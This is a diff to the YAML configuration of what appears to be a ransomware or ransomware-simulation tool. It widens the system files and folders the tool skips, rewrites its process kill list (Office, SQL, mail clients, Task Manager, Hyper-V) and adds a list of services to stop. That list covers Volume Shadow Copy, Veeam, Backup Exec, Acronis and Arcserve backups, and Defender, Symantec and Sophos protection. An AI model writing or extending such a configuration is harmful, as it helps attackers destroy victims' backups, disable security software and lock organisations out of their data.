@@ -60,6 +60,10 @@ file_name_skips: # No matter what, will skip files containing these strings in t
   - bootmgr
   - OUT
   - NTUSER
+  - desktop
+  - thumbs
+  - bootsect
+  - autorun
 file_extension_skips: # No matter what, will skip files with these extensions
   - .exe
   - .dll
@@ -67,6 +71,32 @@ file_extension_skips: # No matter what, will skip files with these extensions
   - .sys
   - .msi
   - .bat
+  - .lib
+  - .pack
+  - .search-ms
+  - .dat
+  - .ini
+  - .theme
+  - .wpx
+  - .cpl
+  - .adv
+  - .msc
+  - .scr
+  - .bat
+  - .key
+  - .ico
+  - .com
+  - .diagcab
+  - .icl
+  - .ocx
+  - .rom
+  - .themepack
+  - .msstyles
+  - .icns
+  - .mpa
+  - .drv
+  - .cmd
+  - .shs
 directory_skips: # No matter what, will skip directories containing these strings in the name - use lower-case, does not use regex
   - windows
   - tor browser
@@ -78,12 +108,28 @@ directory_skips: # No matter what, will skip directories containing these string
   - application data
   - boot
   - local settings
-process_kill_names: # If -kill flag, will attempt to stop these processes (if running) on target machine
-  - "vmms.exe"
+  - program files
+  - appdata
+  - programdata
+  - system volume information
+  - program files (x86)
+  - intel
+  - perflogs
+  - msocache
+  - ntldr
+process_kill_names: # If -killprocs flag, will attempt to stop these processes (if running) on target machine
+  - "agntsvc.exe"
+  - "dbsnmp.exe"
+  - "dbeng50.exe"
+  - "encsvc.exe"
+  - "excel.exe"
+  - "explorer.exe"
+  - "firefox.exe"
+  - "infopath.exe"
+  - "isqlplussvc.exe"
   - "msaccess.exe"
   - "mspub.exe"
-  - "svchost.exe"
-  - "vmcompute.exe"
+  - "mydesktopqos.exe"
   - "notepad.exe"
   - "ocautoupds.exe"
   - "ocomm.exe"
@@ -92,22 +138,79 @@ process_kill_names: # If -kill flag, will attempt to stop these processes (if ru
   - "onenote.exe"
   - "outlook.exe"
   - "powerpnt.exe"
-  - "explorer.exe"
+  - "sqbcoreservice.exe"
   - "sql.exe"
   - "steam.exe"
   - "synctime.exe"
-  - "vmwp.exe"
+  - "svchost.exe"
+  - "taskmgr.exe"
+  - "tbirdconfig.exe"
+  - "teamviewer.exe"
   - "thebat.exe"
   - "thunderbird.exe"
   - "visio.exe"
+  - "vmcompute.exe"
+  - "vmms.exe"
+  - "vmwp.exe"
   - "winword.exe"
   - "wordpad.exe"
   - "xfssvccon.exe"
-  - "teamviewer.exe"
-  - "agntsvc.exe"
-  - "dbsnmp.exe"
-  - "dbeng50.exe"
-  - "encsvc.exe"
+service_kill_names:
+  - vss # vss
+  - bits # bits
+  - gxvss
+  - gxglr
+  - gxfwd
+  - gxcvd
+  - gxcimgr
+  - VSNAPVSS # StorageCraft Volume Snapshot VSS Provider
+  - VeeamTransportSvc # Veeam Backup Transport Service
+  - VeeamDeploymentService # Veeam Deployment Service
+  - VeeamNFSSvc # Veeam Backup and Replication Service
+  - VeeamMountSvc # Veeam Mount Service
+  - VeeamService # Veeam Backup Service
+  - Veeam # Veeam Backup Service
+  - VeeamEndpointBackupSvc # Veeam Agent for Microsoft Windows Service
+  - PDVFSService # Veritas Backup Exec PureDisk Filesystem
+  - BackupExecVSSProvider # Veritas Backup Exec VSS Provider
+  - BackupExecAgentAccelerator # Veritas Backup Exec Agent Accelerator
+  - BackupExecAgentBrowser # Veritas Backup Exec Agent Browser
+  - BackupExecDiveciMediaService # Veritas Backup Exec Device Media Service
+  - BackupExecJobEngine # Veritas Backup Exec Job Engine
+  - BackupExecManagementService # Veritas Backup Exec Management Service
+  - BackupExecRPCService # Veritas Backup Exec RPC Service
+  - AcrSch2Svc # Acronis Scheduler Service
+  - AcronisAgent # Acronis Agent Service
+  - CASAD2DWebSvc # Arcserve UDP Agent service
+  - CAARCUpdateSvc # Arcserve UDP Update Service
+  - QBFCService # QuickBooks
+  - QBIDPService # QuickBooks
+  - QBCFMonitorService # QuickBooks
+  - Intuit.QuickBooks.FCS # QuickBooks
+  - sql # SQL Server
+  - memtas
+  - mepocs
+  - mssql # SQL Server
+  - backup
+  - windefend # defender
+  - wscsvc # defender
+  - sense # defender
+  - securityhealthservice # defender
+  - wdboot # defender
+  - wdfilter # defender
+  - wdnisdrv # defender
+  - wdnissvc # defender
+  - defwatch # symantec
+  - ccevtmgr # symantec
+  - ccsetmgr # symantec
+  - savroam # symantec
+  - rtvscan # symantec
+  - defwatch # symantec
+  - sophos # sophos
+  - stc_raw_agent # STC Raw Backup Agent
+  - zhudongfangyu # 360 by Qihoo 360 Deep Scan
+  - yoobackup # Wooxo
+  - yooit # Wooxo
 file_extension_targets: # Will only target files with these extensions
   - .$er
   - .4dd
